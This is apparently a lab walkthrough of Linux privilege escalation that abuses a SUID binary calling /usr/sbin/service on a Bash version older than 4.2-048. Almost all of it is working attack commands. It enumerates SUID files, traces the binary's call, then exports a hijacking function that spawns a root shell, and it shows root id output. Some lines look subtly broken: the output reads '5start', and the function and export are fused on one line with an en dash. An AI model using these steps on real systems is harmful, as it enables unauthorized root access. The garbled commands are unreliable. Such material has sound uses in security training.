In some shells (notably Bash <4.2-048) it is possible to define user functions with an absolute path name.

These functions can be exported so that subprocesses have access to them, and the functions can take precedence over the actual executable being called.

1. Find SUID/SGID files on the target:

```bash - target
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```

==-rwsr-sr-x 1 root staff 6899 May 14 2017 /usr/local/bin/suid-env2==

The suid-env file should execute with root user permissions.

2. Run strings on the SUID file:

```bash - target
strings /usr/local/bin/suid-env2
```

/usr/sbin/service apache2 start

The file could be trying to run the /usr/sbin/service program.

3. We can verify this with strace:

```bash - target
strace -v -f -e execve /usr/local/bin/suid-env2 2>&1 | grep service
```

> [pid 16729] execve("/bin/sh", ["sh", "-c", "/usr/sbin/service apache2 5start"]...

4. Optionally, we can also verify with ltrace:

```bash - target
ltrace /usr/local/bin/suid-env2 2>&1 | grep service
```

system("/usr/sbin/service apache2 start"

This reveals that the system function is being used to execute the /usr/sbin/service program.

5. Verify the version of Bash is lower than 4.2-048:

```bash - target
bash --version
```

GNU bash, version 4.1.5(1)-release (x86_64-pc-linux-gnu)

6. Create a Bash function with the name “/usr/sbin/service” and export the function:

```bash - target
function /usr/sbin/service { /bin/bash -p; } export –f /usr/sbin/service
```

7. Execute the SUID file for a root shell:
```bash - target
/usr/local/bin/suid-env2
```

```bash - target
id
```

> uid=0(root) gid=0(root) groups=0(root)